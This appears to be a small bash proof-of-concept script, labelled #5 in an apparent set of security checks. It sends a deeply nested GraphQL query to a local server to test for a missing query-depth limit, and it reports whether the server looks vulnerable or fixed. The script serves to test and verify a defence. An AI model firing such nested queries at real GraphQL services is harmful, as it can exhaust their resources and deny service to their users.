#!/usr/bin/env bash
# #5 Deep-query DoS — posts and authors reference each other, so a query can
# nest arbitrarily deep. With no depth limit the server happily resolves it.
set -euo pipefail
URL="http://127.0.0.1:8000/graphql/"

Q='{ me{ posts{ author{ posts{ author{ posts{ id }}}}}} }'

echo "Sending a deeply nested query:"
curl -s -G "$URL" --data-urlencode "query=$Q" \
  | jq '{data_present: (.data != null), errors: (.errors | length)}'
echo "(data_present=true / no errors = vulnerable; a depth error = fixed)"
